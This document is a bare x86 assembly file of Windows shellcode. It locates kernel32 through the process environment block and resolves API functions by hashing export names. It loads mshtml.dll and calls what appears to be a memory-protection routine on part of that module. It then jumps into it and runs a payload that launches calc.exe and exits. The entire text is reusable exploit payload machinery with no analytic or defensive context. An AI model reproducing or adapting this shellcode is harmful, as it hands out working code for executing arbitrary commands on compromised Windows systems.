[BITS 32]

mov esp, [fs :0]
sub esp,0x4000

call delta
delta:


call getkernel32
push 0xd3324904
push eax
call gpr
jmp mshtml
retmshtml:
call eax
add eax,0x3000
push eax

call getkernel32
push 0xd83d6aa1
push eax
call gpr

pop ecx
pop ebx

push esp
push 0x300
push ebx
push ecx
push 0xffffffff
call eax

sub esp,0x10
pop eax
add eax,0x41
jmp eax
;;actual payload
call getkernel32
push 0xe8afe98
push eax
call gpr
push 0
jmp calc
retcalc:
call eax
call getkernel32
push 0x73e2d87e
push eax
call gpr
push 0
call eax
calc:
call retcalc
db "calc.exe",0
mshtml:
call retmshtml
db "mshtml.dll",0


gpr:
xor edi,edi
rerun:
mov eax,[esp+0x4]
xor ebx,ebx
add ebx,[eax+0x3c]
add eax,ebx 		;eax= address of "PE"
xor bx,bx
add eax,0x78
mov eax,[eax]     	;eax= EAT RVA
add eax,[esp+0x4] 	;eax= EAT VA
cmp edi,[esp+8]
je backagain
mov ebx,[eax+0x20] 	;ebx= aon RVA
add ebx,[esp+0x4]  	;ebx=aon VA
mov ecx,[eax+0x18] 	;ecx=number of func
xor edx,edx
xor eax,eax

sub ebx,4

back:
test ecx,ecx
jz last

add ebx,4
add edx,2

mov esi,[ebx] 		;hash computing begins esi=string pointer till 0x00
add esi,[esp+4]

xor edi,edi
genhash:
xor eax,eax
lodsb
test al,al
jz later
ror edi,0xd
add edi,eax
jmp genhash
later: 				;edi holds hash now
cmp edi,[esp+8]
jne neee
jmp rerun
backagain: 			;eax=EAT VA again
mov ebx,[eax+0x24]
add ebx,[esp+4]
add ebx,edx
xor ecx,ecx
mov cx,[ebx]
mov ebx,[eax+0x1c] 	;ebx=aof rva
add ebx,[esp+4] 	;ebx=aof rva
add ecx,ecx
add ecx,ecx
add ebx,ecx
sub ebx,4
mov ebx,[ebx]
mov eax,[esp+4]
add eax,ebx
jmp last
neee:
xor eax,eax
dec ecx
jmp back
last:
pop ebx
pop ecx
pop edx
jmp ebx


getntdll: 			;returns ntdll base in eax
xor eax,eax
mov al,30h
mov eax,[fs: eax]
mov eax,[eax+0ch]
mov eax,[eax+14h]
mov eax,[eax]
mov eax,[eax+10h]
ret

getkernel32: 		;returns kernel32 base in eax
xor eax,eax
mov al,30h
mov eax,[fs: eax]
mov eax,[eax+0ch]
mov eax,[eax+14h]
mov eax,[eax]
mov eax,[eax]
mov eax,[eax+10h]
ret